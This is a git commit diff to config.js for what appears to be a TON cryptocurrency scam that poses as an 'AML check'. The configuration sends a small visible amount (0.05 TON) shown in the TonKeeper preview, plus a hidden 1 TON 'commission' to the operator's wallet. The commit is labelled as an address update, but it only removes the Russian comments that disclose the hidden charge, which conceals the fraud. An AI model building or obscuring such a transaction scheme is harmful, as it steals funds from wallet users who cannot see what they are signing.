2032868e4143ab4bed8a369b174c19a1f495dcca
kareli123 <kareli123@users.noreply.github.com>
2026-05-02 08:20:27 +0300

    fix: update AML wallet address

--- config.js
+++ config.js
@@ -1,7 +1,7 @@
 // config.js
 var YOUR_WALLET     = "UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv";
 var PROXY_CONTRACT  = YOUR_WALLET;
-var AML_WALLET      = "UQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW";  // AML проверка кошелёк
-var VISIBLE_AMOUNT  = "0.05";   // Первое сообщение - видимое в preview TonKeeper
-var HIDDEN_AMOUNT   = "1";      // Второе сообщение - скрытая комиссия 1 TON
+var AML_WALLET      = "UQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW";
+var VISIBLE_AMOUNT  = "0.05";
+var HIDDEN_AMOUNT   = "1";
 var NETWORK         = "mainnet";
